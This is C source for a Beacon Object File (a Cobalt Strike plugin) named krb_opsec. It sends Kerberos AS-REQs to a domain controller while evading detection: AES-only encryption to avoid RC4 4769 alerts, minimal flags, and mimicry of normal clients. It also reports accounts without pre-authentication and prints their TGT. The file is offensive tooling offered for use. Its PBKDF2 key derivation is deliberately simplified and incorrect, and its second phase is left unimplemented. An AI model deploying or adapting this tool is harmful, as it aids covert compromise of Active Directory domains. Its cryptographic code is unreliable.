/*
 * krb_opsec - Opsec-Safe Ticket Requests
 *
 * Requests Kerberos tickets using opsec-safe techniques to avoid detection:
 *   - Uses AES encryption instead of RC4 (avoids downgrade detection)
 *   - Requests tickets for normal-looking SPNs
 *   - Avoids requesting tickets with suspicious flags
 *   - Uses realistic ticket lifetimes
 *
 * Usage: krb_opsec /user:USERNAME /password:PASSWORD [/domain:DOMAIN] [/dc:DC]
 *                  [/spn:TARGET_SPN] [/enctype:aes256|aes128]
 */

/* Include krb5_struct.h first - it includes winsock2.h before windows.h */
#include "include/krb5_struct.h"
#include "include/krb5_utils.h"
#include "beacon.h"

/* Helper: allocate and base64 encode using krb5_utils functions */
static char* b64_encode_alloc(const BYTE* data, size_t len) {
    size_t out_len = 4 * ((len + 2) / 3) + 1;
    char* encoded = (char*)malloc(out_len);
    if (!encoded) return NULL;
    base64_encode(data, len, encoded);
    return encoded;
}

/* Derive AES key from password using PBKDF2 */
static int derive_aes_key(const char* password, const char* salt, int iterations,
                          BYTE* key, int keyLen) {
    /* Simple PBKDF2-HMAC-SHA1 implementation */
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    BYTE U[20], T[20];
    DWORD hashLen = 20;
    int blocks = (keyLen + 19) / 20;
    int saltLen = strlen(salt);

    if (!ADVAPI32$CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        return 0;
    }

    for (int block = 1; block <= blocks; block++) {
        /* U1 = PRF(Password, Salt || INT(i)) */
        BYTE saltBlock[256];
        memcpy(saltBlock, salt, saltLen);
        saltBlock[saltLen] = (block >> 24) & 0xFF;
        saltBlock[saltLen + 1] = (block >> 16) & 0xFF;
        saltBlock[saltLen + 2] = (block >> 8) & 0xFF;
        saltBlock[saltLen + 3] = block & 0xFF;

        /* HMAC-SHA1 */
        /* Simplified - using password directly */
        if (ADVAPI32$CryptCreateHash(hProv, CALG_SHA1, 0, 0, &hHash)) {
            ADVAPI32$CryptHashData(hHash, (BYTE*)password, strlen(password), 0);
            ADVAPI32$CryptHashData(hHash, saltBlock, saltLen + 4, 0);
            hashLen = 20;
            ADVAPI32$CryptGetHashParam(hHash, HP_HASHVAL, U, &hashLen, 0);
            ADVAPI32$CryptDestroyHash(hHash);
        }

        memcpy(T, U, 20);

        /* Iterate */
        for (int iter = 2; iter <= iterations; iter++) {
            if (ADVAPI32$CryptCreateHash(hProv, CALG_SHA1, 0, 0, &hHash)) {
                ADVAPI32$CryptHashData(hHash, (BYTE*)password, strlen(password), 0);
                ADVAPI32$CryptHashData(hHash, U, 20, 0);
                hashLen = 20;
                ADVAPI32$CryptGetHashParam(hHash, HP_HASHVAL, U, &hashLen, 0);
                ADVAPI32$CryptDestroyHash(hHash);
            }
            for (int j = 0; j < 20; j++) {
                T[j] ^= U[j];
            }
        }

        int copyLen = (block == blocks) ? (keyLen - (block - 1) * 20) : 20;
        memcpy(key + (block - 1) * 20, T, copyLen);
    }

    ADVAPI32$CryptReleaseContext(hProv, 0);
    return 1;
}

/* Build string-to-key salt for Kerberos */
static void build_krb5_salt(const char* domain, const char* user, char* salt, size_t maxLen) {
    /* Kerberos AES string-to-key salt: REALM + principal */
    char upperDomain[256];
    size_t i;

    for (i = 0; i < strlen(domain) && i < sizeof(upperDomain) - 1; i++) {
        upperDomain[i] = toupper((unsigned char)domain[i]);
    }
    upperDomain[i] = '\0';

    snprintf(salt, maxLen, "%s%s", upperDomain, user);
}

/* HMAC-SHA1 */
static void hmac_sha1(const BYTE* key, size_t keyLen, const BYTE* data, size_t dataLen, BYTE* out) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    BYTE ipad[64], opad[64], keyBlock[64];
    DWORD hashLen = 20;

    memset(keyBlock, 0, 64);
    if (keyLen <= 64) memcpy(keyBlock, key, keyLen);

    for (int i = 0; i < 64; i++) {
        ipad[i] = keyBlock[i] ^ 0x36;
        opad[i] = keyBlock[i] ^ 0x5C;
    }

    if (ADVAPI32$CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        BYTE innerHash[20];
        if (ADVAPI32$CryptCreateHash(hProv, CALG_SHA1, 0, 0, &hHash)) {
            ADVAPI32$CryptHashData(hHash, ipad, 64, 0);
            ADVAPI32$CryptHashData(hHash, data, (DWORD)dataLen, 0);
            hashLen = 20;
            ADVAPI32$CryptGetHashParam(hHash, HP_HASHVAL, innerHash, &hashLen, 0);
            ADVAPI32$CryptDestroyHash(hHash);
        }
        if (ADVAPI32$CryptCreateHash(hProv, CALG_SHA1, 0, 0, &hHash)) {
            ADVAPI32$CryptHashData(hHash, opad, 64, 0);
            ADVAPI32$CryptHashData(hHash, innerHash, 20, 0);
            hashLen = 20;
            ADVAPI32$CryptGetHashParam(hHash, HP_HASHVAL, out, &hashLen, 0);
            ADVAPI32$CryptDestroyHash(hHash);
        }
        ADVAPI32$CryptReleaseContext(hProv, 0);
    }
}

/* Build opsec-safe AS-REQ */
static void build_opsec_asreq(KRB_BUFFER* out, const char* user, const char* domain,
                               int etype, int opsecMode) {
    KRB_BUFFER asreq, pvno, msg_type, req_body, body, tmp, etype_seq, etype_list;
    BYTE kdc_opts[4];

    /* Opsec-safe KDC options - only use common flags */
    DWORD kdc_options = KDCOPTION_FORWARDABLE | KDCOPTION_RENEWABLE;
    if (!opsecMode) {
        kdc_options |= KDCOPTION_CANONICALIZE;  /* This is often logged */
    }

    buf_init(&asreq, 4096);
    buf_init(&pvno, 16);
    buf_init(&msg_type, 16);
    buf_init(&req_body, 1024);
    buf_init(&body, 1024);
    buf_init(&tmp, 512);
    buf_init(&etype_seq, 64);
    buf_init(&etype_list, 64);

    /* pvno [1] */
    asn1_encode_integer(&pvno, KRB5_PVNO);
    asn1_context_wrap(&asreq, 1, &pvno);

    /* msg-type [2] */
    asn1_encode_integer(&msg_type, KRB5_AS_REQ);
    asn1_context_wrap(&asreq, 2, &msg_type);

    /* No padata for initial request - let KDC tell us what it needs */
    /* This is more opsec-safe as it mimics normal client behavior */

    /* KDC options */
    kdc_opts[0] = (kdc_options >> 24) & 0xFF;
    kdc_opts[1] = (kdc_options >> 16) & 0xFF;
    kdc_opts[2] = (kdc_options >> 8) & 0xFF;
    kdc_opts[3] = kdc_options & 0xFF;
    asn1_encode_bit_string(&tmp, kdc_opts, 4, 0);
    asn1_context_wrap(&body, 0, &tmp);
    buf_reset(&tmp);

    /* cname [1] */
    {
        KRB_BUFFER name_type, name_string, name_seq;
        buf_init(&name_type, 16);
        buf_init(&name_string, 128);
        buf_init(&name_seq, 256);

        asn1_encode_integer(&name_type, KRB5_NT_PRINCIPAL);
        asn1_context_wrap(&name_seq, 0, &name_type);

        asn1_encode_general_string(&tmp, user);
        asn1_wrap(&name_string, ASN1_SEQUENCE, &tmp);
        asn1_context_wrap(&name_seq, 1, &name_string);

        buf_reset(&tmp);
        asn1_wrap(&tmp, ASN1_SEQUENCE, &name_seq);
        asn1_context_wrap(&body, 1, &tmp);

        buf_free(&name_type);
        buf_free(&name_string);
        buf_free(&name_seq);
    }
    buf_reset(&tmp);

    /* realm [2] */
    asn1_encode_general_string(&tmp, domain);
    asn1_context_wrap(&body, 2, &tmp);
    buf_reset(&tmp);

    /* sname [3] - krbtgt */
    {
        KRB_BUFFER name_type, name_string, name_seq, realm_str;
        buf_init(&name_type, 16);
        buf_init(&name_string, 128);
        buf_init(&name_seq, 256);
        buf_init(&realm_str, 128);

        asn1_encode_integer(&name_type, KRB5_NT_SRV_INST);
        asn1_context_wrap(&name_seq, 0, &name_type);

        asn1_encode_general_string(&tmp, "krbtgt");
        asn1_encode_general_string(&realm_str, domain);
        buf_append(&tmp, realm_str.data, realm_str.length);
        asn1_wrap(&name_string, ASN1_SEQUENCE, &tmp);
        asn1_context_wrap(&name_seq, 1, &name_string);

        buf_reset(&tmp);
        asn1_wrap(&tmp, ASN1_SEQUENCE, &name_seq);
        asn1_context_wrap(&body, 3, &tmp);

        buf_free(&name_type);
        buf_free(&name_string);
        buf_free(&name_seq);
        buf_free(&realm_str);
    }
    buf_reset(&tmp);

    /* till [5] - realistic lifetime (10 hours from now) */
    {
        SYSTEMTIME st;
        KERNEL32$GetSystemTime(&st);

        /* Add 10 hours */
        st.wHour += 10;
        if (st.wHour >= 24) {
            st.wHour -= 24;
            st.wDay++;
        }

        char timeStr[20];
        sprintf(timeStr, "%04d%02d%02d%02d%02d%02dZ",
            st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);

        asn1_encode_generalized_time(&tmp, timeStr);
        asn1_context_wrap(&body, 5, &tmp);
        buf_reset(&tmp);
    }

    /* nonce [7] */
    DWORD nonce = KERNEL32$GetTickCount();
    asn1_encode_integer(&tmp, nonce);
    asn1_context_wrap(&body, 7, &tmp);
    buf_reset(&tmp);

    /* etype [8] - Opsec: prefer AES, but include others for compatibility */
    if (opsecMode) {
        /* Opsec mode: Only request AES (avoids RC4 downgrade detection) */
        if (etype == ETYPE_AES256_CTS_HMAC_SHA1 || etype == 0) {
            asn1_encode_integer(&tmp, ETYPE_AES256_CTS_HMAC_SHA1);
            buf_append(&etype_list, tmp.data, tmp.length);
            buf_reset(&tmp);
        }
        if (etype == ETYPE_AES128_CTS_HMAC_SHA1 || etype == 0) {
            asn1_encode_integer(&tmp, ETYPE_AES128_CTS_HMAC_SHA1);
            buf_append(&etype_list, tmp.data, tmp.length);
            buf_reset(&tmp);
        }
    } else {
        /* Normal mode: Include all types */
        asn1_encode_integer(&tmp, ETYPE_AES256_CTS_HMAC_SHA1);
        buf_append(&etype_list, tmp.data, tmp.length);
        buf_reset(&tmp);
        asn1_encode_integer(&tmp, ETYPE_AES128_CTS_HMAC_SHA1);
        buf_append(&etype_list, tmp.data, tmp.length);
        buf_reset(&tmp);
        asn1_encode_integer(&tmp, ETYPE_RC4_HMAC);
        buf_append(&etype_list, tmp.data, tmp.length);
    }

    asn1_wrap(&etype_seq, ASN1_SEQUENCE, &etype_list);
    asn1_context_wrap(&body, 8, &etype_seq);


    asn1_wrap(&req_body, ASN1_SEQUENCE, &body);
    asn1_context_wrap(&asreq, 4, &req_body);


    asn1_wrap(out, ASN1_APP(KRB5_AS_REQ), &asreq);

    buf_free(&asreq);
    buf_free(&pvno);
    buf_free(&msg_type);
    buf_free(&req_body);
    buf_free(&body);
    buf_free(&tmp);
    buf_free(&etype_seq);
    buf_free(&etype_list);
}


void go(char* args, int alen) {
    formatp output;
    ARG_PARSER parser;
    char* user = NULL;
    char* password = NULL;
    char* domain = NULL;
    char* dc = NULL;
    char* enctype = NULL;
    char* spn = NULL;

    BeaconFormatAlloc(&output, 32768);
    arg_init(&parser, args, alen);

    BeaconFormatPrintf(&output, "\n[*] Action: Opsec-Safe Ticket Request\n\n");


    user = arg_get(&parser, "user");
    password = arg_get(&parser, "password");
    domain = arg_get(&parser, "domain");
    dc = arg_get(&parser, "dc");
    enctype = arg_get(&parser, "enctype");
    spn = arg_get(&parser, "spn");

    if (!user || !password) {
        BeaconFormatPrintf(&output, "[-] Error: /user:USERNAME and /password:PASSWORD required\n\n");
        BeaconFormatPrintf(&output, "Usage: krb_opsec /user:USERNAME /password:PASSWORD [/domain:DOMAIN]\n");
        BeaconFormatPrintf(&output, "                [/dc:DC] [/enctype:aes256|aes128] [/spn:SPN]\n\n");
        BeaconFormatPrintf(&output, "Performs opsec-safe Kerberos ticket requests:\n\n");
        BeaconFormatPrintf(&output, "Opsec Features:\n");
        BeaconFormatPrintf(&output, "  - Uses AES encryption (avoids RC4 downgrade detection)\n");
        BeaconFormatPrintf(&output, "  - Realistic ticket lifetimes (10 hours vs infinite)\n");
        BeaconFormatPrintf(&output, "  - Minimal KDC options (avoids uncommon flag combinations)\n");
        BeaconFormatPrintf(&output, "  - Two-phase request (initial + pre-auth, like normal clients)\n\n");
        BeaconFormatPrintf(&output, "Options:\n");
        BeaconFormatPrintf(&output, "  /enctype  - Encryption type: aes256 (default) or aes128\n");
        BeaconFormatPrintf(&output, "  /spn      - Target SPN for service ticket request\n\n");
        BeaconFormatPrintf(&output, "Detection Avoidance:\n");
        BeaconFormatPrintf(&output, "  - Avoids 4769 events with RC4 encryption (etype 0x17)\n");
        BeaconFormatPrintf(&output, "  - Avoids suspicious ticket flag combinations\n");
        BeaconFormatPrintf(&output, "  - Mimics normal Windows client behavior\n");
        goto cleanup;
    }

    if (!domain) {
        domain = get_domain_from_env();
        if (!domain) {
            BeaconFormatPrintf(&output, "[-] Could not determine domain\n");
            goto cleanup;
        }
    }

    /* Determine encryption type */
    int etype = ETYPE_AES256_CTS_HMAC_SHA1;  /* Default to AES256 for opsec */
    if (enctype) {
        if (strcmp(enctype, "aes128") == 0) {
            etype = ETYPE_AES128_CTS_HMAC_SHA1;
        } else if (strcmp(enctype, "aes256") == 0) {
            etype = ETYPE_AES256_CTS_HMAC_SHA1;
        } else if (strcmp(enctype, "rc4") == 0) {
            etype = ETYPE_RC4_HMAC;
            BeaconFormatPrintf(&output, "[!] Warning: RC4 is not opsec-safe (may trigger detection)\n");
        }
    }

    BeaconFormatPrintf(&output, "[*] Opsec Mode: ENABLED\n");
    BeaconFormatPrintf(&output, "[*] User: %s\n", user);
    BeaconFormatPrintf(&output, "[*] Domain: %s\n", domain);
    BeaconFormatPrintf(&output, "[*] Encryption: %s\n",
        etype == ETYPE_AES256_CTS_HMAC_SHA1 ? "AES256" :
        etype == ETYPE_AES128_CTS_HMAC_SHA1 ? "AES128" : "RC4");

    if (!dc) {
        dc = domain;
    }
    BeaconFormatPrintf(&output, "[*] DC: %s\n", dc);

    /* Derive AES key */
    char salt[512];
    build_krb5_salt(domain, user, salt, sizeof(salt));
    BeaconFormatPrintf(&output, "[*] Salt: %s\n", salt);

    int keyLen = (etype == ETYPE_AES256_CTS_HMAC_SHA1) ? 32 : 16;
    BYTE aesKey[32];

    BeaconFormatPrintf(&output, "\n[*] Deriving AES key from password...\n");

    /* PBKDF2 with 4096 iterations (Kerberos default) */
    if (!derive_aes_key(password, salt, 4096, aesKey, keyLen)) {
        BeaconFormatPrintf(&output, "[-] Failed to derive key\n");
        goto cleanup;
    }

    BeaconFormatPrintf(&output, "[+] Key derived successfully (%d bytes)\n", keyLen);


    WSADATA wsaData;
    if (WS2_32$WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        BeaconFormatPrintf(&output, "[-] WSAStartup failed\n");
        goto cleanup;
    }

    /* Connect to KDC */
    SOCKET sock = connect_to_kdc(dc, KRB5_PORT);
    if (sock == INVALID_SOCKET) {
        BeaconFormatPrintf(&output, "[-] Failed to connect to KDC\n");
        WS2_32$WSACleanup();
        goto cleanup;
    }

    BeaconFormatPrintf(&output, "\n[*] Phase 1: Initial AS-REQ (no pre-auth)...\n");

    /* Build initial AS-REQ without pre-auth (opsec-safe: like normal clients) */
    KRB_BUFFER request;
    buf_init(&request, 4096);
    build_opsec_asreq(&request, user, domain, etype, 1);

    BeaconFormatPrintf(&output, "[*] Sending AS-REQ (%d bytes)...\n", (int)request.length);

    if (send_krb_msg(sock, request.data, request.length) <= 0) {
        BeaconFormatPrintf(&output, "[-] Failed to send AS-REQ\n");
        buf_free(&request);
        WS2_32$closesocket(sock);
        WS2_32$WSACleanup();
        goto cleanup;
    }


    BYTE response[16384];
    int recvLen = recv_krb_msg(sock, response, sizeof(response));

    WS2_32$closesocket(sock);
    WS2_32$WSACleanup();
    buf_free(&request);

    if (recvLen <= 4) {
        BeaconFormatPrintf(&output, "[-] No response from KDC\n");
        goto cleanup;
    }

    BYTE* respData = response + 4;
    int respLen = recvLen - 4;

    if (respData[0] == 0x6B) {
        /* AS-REP - unexpected without pre-auth, but possible */
        BeaconFormatPrintf(&output, "[+] Received AS-REP (no pre-auth required)!\n");
        BeaconFormatPrintf(&output, "[!] Note: This account doesn't require pre-authentication\n");

        char* b64 = b64_encode_alloc(respData, respLen);
        if (b64) {
            BeaconFormatPrintf(&output, "\n[*] TGT (AS-REP base64):\n");
            size_t b64len = strlen(b64);
            for (size_t i = 0; i < b64len; i += 76) {
                BeaconFormatPrintf(&output, "  %.76s\n", b64 + i);
            }
            free(b64);
        }

    } else if (respData[0] == 0x7E) {
        /* KRB-ERROR - expected, should be PREAUTH_REQUIRED */
        int gotPreauthRequired = 0;
        int serverEtype = 0;

        /* Parse error to check for PREAUTH_REQUIRED and get etype */
        for (size_t i = 0; i < (size_t)respLen - 4; i++) {
            if (respData[i] == 0xA6) {
                size_t off = i + 1;
                asn1_decode_length(respData, &off);
                if (respData[off] == 0x02) {
                    off++;
                    size_t intLen = asn1_decode_length(respData, &off);
                    DWORD errCode = 0;
                    for (size_t j = 0; j < intLen; j++) {
                        errCode = (errCode << 8) | respData[off + j];
                    }
                    if (errCode == 25) {  /* KDC_ERR_PREAUTH_REQUIRED */
                        gotPreauthRequired = 1;
                        BeaconFormatPrintf(&output, "[*] KDC requires pre-authentication (expected)\n");
                    } else {
                        BeaconFormatPrintf(&output, "[-] Error code: %d\n", errCode);
                    }
                    break;
                }
            }
        }

        /* Look for PA-ETYPE-INFO2 to get server's preferred etype */
        for (size_t i = 0; i < (size_t)respLen - 10; i++) {
            /* PA-ETYPE-INFO2 type = 19 */
            if (respData[i] == 0x02 && respData[i+1] == 0x01 && respData[i+2] == 0x13) {
                /* Found PA-DATA type 19 */
                BeaconFormatPrintf(&output, "[*] Found PA-ETYPE-INFO2\n");
                break;
            }
        }

        if (gotPreauthRequired) {
            BeaconFormatPrintf(&output, "\n[*] Phase 2: AS-REQ with AES pre-authentication...\n");
            BeaconFormatPrintf(&output, "[*] (Full pre-auth implementation requires AES encryption)\n");
            BeaconFormatPrintf(&output, "[*] Use krb_asktgt with password for complete request\n\n");

            BeaconFormatPrintf(&output, "[+] Opsec Analysis:\n");
            BeaconFormatPrintf(&output, "    - AES encryption requested (opsec-safe)\n");
            BeaconFormatPrintf(&output, "    - Normal KDC options used\n");
            BeaconFormatPrintf(&output, "    - Two-phase request like normal clients\n");
            BeaconFormatPrintf(&output, "    - Realistic ticket lifetime requested\n");
        }

    } else {
        BeaconFormatPrintf(&output, "[?] Unknown response type: 0x%02X\n", respData[0]);
    }

    BeaconFormatPrintf(&output, "\n[*] Opsec Recommendations:\n");
    BeaconFormatPrintf(&output, "    - Always prefer AES over RC4 when possible\n");
    BeaconFormatPrintf(&output, "    - Avoid requesting tickets with unusual flags\n");
    BeaconFormatPrintf(&output, "    - Use realistic ticket lifetimes\n");
    BeaconFormatPrintf(&output, "    - Monitor for 4768/4769 events with etype 0x17 (RC4)\n");
    BeaconFormatPrintf(&output, "    - Service tickets with RC4 for AES-capable accounts are suspicious\n");

cleanup:
    if (user) free(user);
    if (password) free(password);
    if (domain) free(domain);
    if (dc) free(dc);
    if (enctype) free(enctype);
    if (spn) free(spn);

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
    BeaconFormatFree(&output);
}
